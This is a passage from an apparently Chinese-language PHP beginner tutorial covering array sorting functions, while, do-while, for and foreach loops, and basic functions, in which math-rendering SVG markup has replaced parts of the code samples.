-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-67" x="529" y="0"></use>
- <use xlink:href="#E1-MJMATHI-65" x="1010" y="0"></use>
- <use xlink:href="#E1-MJMATHI-61" x="1476" y="0"></use>
- <use xlink:href="#E1-MJMATHI-73" x="2006" y="0"></use>
-</g>
-</svg>x&#x3D;&gt;$x_value)<br>&#123;<br>	echo &quot;key&#x3D;&quot; . <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="12.478ex" height="2.509ex" style="vertical-align: -0.671ex;" viewBox="0 -791.3 5372.6 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">x . ", value" . </title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-76" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-78" x="0" y="0"></use>
- <use xlink:href="#E1-MJMAIN-2E" x="572" y="0"></use>
- <use xlink:href="#E1-MJMAIN-22" x="1017" y="0"></use>
- <use xlink:href="#E1-MJMAIN-2C" x="1518" y="0"></use>
- <use xlink:href="#E1-MJMATHI-76" x="1963" y="0"></use>
- <use xlink:href="#E1-MJMATHI-61" x="2448" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6C" x="2978" y="0"></use>
- <use xlink:href="#E1-MJMATHI-75" x="3276" y="0"></use>
- <use xlink:href="#E1-MJMATHI-65" x="3849" y="0"></use>
- <use xlink:href="#E1-MJMAIN-22" x="4593" y="0"></use>
- <use xlink:href="#E1-MJMAIN-2E" x="5094" y="0"></use>
-</g>
-</svg>x_value;<br>	echo &quot;&lt;br&gt;&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210307194444482.png"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="二、数组排序"><a href="#二、数组排序" class="headerlink" title="二、数组排序"></a>二、数组排序</h1><p>数组中的元素可以按字母或数字顺序进行降序或升序排列。</p>
-<p><strong>数组排序函数</strong></p>
-<ul>
-<li>sort() - 对数组进行升序排列</li>
-<li>rsort() - 对数组进行降序排列</li>
-<li>asort() - 根据关联数组的值，对数组进行升序排列</li>
-<li>ksort() - 根据关联数组的键，对数组进行升序排列</li>
-<li>arsort() - 根据关联数组的值，对数组进行降序排列</li>
-<li>krsort() - 根据关联数组的键，对数组进行降序排列</li>
-</ul>
-<p><strong>sort() - 对数组进行升序排列</strong></p>
-<p>将数组中的元素按照字母升序排列<br><img  src="https://img-blog.csdnimg.cn/20210307201128722.png"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>rsort() - 对数组进行降序排列</strong></p>
-<p>将数组中的元素按照字母降序排列<br><img  src="https://img-blog.csdnimg.cn/20210307201144126.png"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>asort() - 根据数组的值，对数组进行升序排列</strong><br><img  src="https://img-blog.csdnimg.cn/2021030720222566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>ksort() - 根据数组的键，对数组进行升序排列</strong><br><img  src="https://img-blog.csdnimg.cn/20210307202349993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>根据以上：<br><strong>arsort() - 根据数组的值，对数组进行降序排列</strong></p>
-<p><strong>krsort() - 根据数组的键，对数组进行降序排列</strong></p>
-<h1 id="三-While-循环"><a href="#三-While-循环" class="headerlink" title="三. While 循环"></a>三. While 循环</h1><p>循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。<br>在您编写代码时，您经常需要让相同的代码块一次又一次地重复运行。我们可以在代码中使用循环语句来完成这个任务。</p>
-<p>在 PHP 中，提供了下列循环语句：</p>
-<ul>
-<li>while - 只要指定的条件成立，则循环执行代码块</li>
-<li>do…while - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</li>
-<li>for - 循环执行代码块指定的次数</li>
-<li>foreach - 根据数组中每个元素来循环代码块</li>
-</ul>
-<p><strong>while 循环</strong><br>while 循环将重复执行代码块，直到指定的条件不成立</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">while (条件)<br>&#123;<br>    要执行的代码;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210307202753922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>do…while 语句</strong></p>
-<p>do…while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">do<br>&#123;<br>    要执行的代码;<br>&#125;<br>while (条件);<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210307203113503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="四-For-循环"><a href="#四-For-循环" class="headerlink" title="四.For 循环"></a>四.For 循环</h1><p>for 循环用于您预先知道脚本需要运行的次数的情况。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">for (初始值; 条件; 增量)<br>&#123;<br>    要执行的代码;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210307203446967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>foreach 循环</strong><br>foreach 循环用于遍历数组。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">foreach (<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="8.033ex" height="2.009ex" style="vertical-align: -0.671ex;" viewBox="0 -576.1 3458.5 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">array as </title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-79" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-72" x="529" y="0"></use>
- <use xlink:href="#E1-MJMATHI-72" x="981" y="0"></use>
- <use xlink:href="#E1-MJMATHI-61" x="1432" y="0"></use>
- <use xlink:href="#E1-MJMATHI-79" x="1962" y="0"></use>
- <use xlink:href="#E1-MJMATHI-61" x="2459" y="0"></use>
- <use xlink:href="#E1-MJMATHI-73" x="2989" y="0"></use>
-</g>
-</svg>value)<br>&#123;<br>    要执行代码;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</p>
-<p><img  src="https://img-blog.csdnimg.cn/20210307203956898.png"  ><span class="image-caption">在这里插入图片描述</span></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">foreach (<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="8.033ex" height="2.009ex" style="vertical-align: -0.671ex;" viewBox="0 -576.1 3458.5 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">array as </title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-79" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-72" x="529" y="0"></use>
- <use xlink:href="#E1-MJMATHI-72" x="981" y="0"></use>
- <use xlink:href="#E1-MJMATHI-61" x="1432" y="0"></use>
- <use xlink:href="#E1-MJMATHI-79" x="1962" y="0"></use>
- <use xlink:href="#E1-MJMATHI-61" x="2459" y="0"></use>
- <use xlink:href="#E1-MJMATHI-73" x="2989" y="0"></use>
-</g>
-</svg>key &#x3D;&gt; $value)<br>&#123;<br>    要执行代码;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>每一次循环，当前数组元素的键与值就都会被赋值给 <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.617ex" height="3.343ex" style="vertical-align: -1.171ex;" viewBox="0 -934.9 2418.4 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">key 和 </title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-6B" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-79" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-6B" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-65" x="521" y="0"></use>
- <use xlink:href="#E1-MJMATHI-79" x="988" y="0"></use>
-<g transform="translate(1485,0)">
-<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">和</text>
-</g>
-</g>
-</svg>value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。<br>也就是下一次循环数组中的键与值都将会移向下一个<br><img  src="https://img-blog.csdnimg.cn/20210307204255163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="五-函数"><a href="#五-函数" class="headerlink" title="五.函数"></a>五.函数</h1><p>函数是通过调用函数来执行的。</p>
-<p>你可以在页面的任何位置调用函数。</p>
-<p><strong>创建 PHP 函数</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br>function functionName()<br>&#123;<br>    &#x2F;&#x2F; 要执行的代码<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
-<p>PHP 函数准则：</p>
-<ul>
-<li>函数的名称应该提示出它的功能</li>
-<li>函数名称以字母或下划线开头（不能以数字开头）<br><img  src="https://img-blog.csdnimg.cn/2021030720463891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></li>
-</ul>
-<p><strong>函数 - 添加参数</strong><br>为了给函数添加更多的功能，我们可以添加参数，参数类似变量。</p>
-<p>参数就在函数名称后面的一个括号内指定。<br>实例将输出不同的名字，但姓是相同的：<br><img  src="https://img-blog.csdnimg.cn/20210307205234407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/202103072057235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>函数 - 返回值</strong><br>如需让函数返回一个值，请使用 return 语句。<br><img  src="https://img-blog.csdnimg.cn/20210307210015604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到再次调用add函数当<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="6.237ex" height="2.509ex" style="vertical-align: -0.671ex;" viewBox="0 -791.3 2685.6 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">x=1,</title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-78" x="0" y="0"></use>
- <use xlink:href="#E1-MJMAIN-3D" x="850" y="0"></use>
- <use xlink:href="#E1-MJMAIN-31" x="1906" y="0"></use>
- <use xlink:href="#E1-MJMAIN-2C" x="2407" y="0"></use>
-</g>
-</svg>y=16时$total的值为17，因此使用return语句可以使函数返回17.</p>
-<p>一个简单的加减实例：</p>
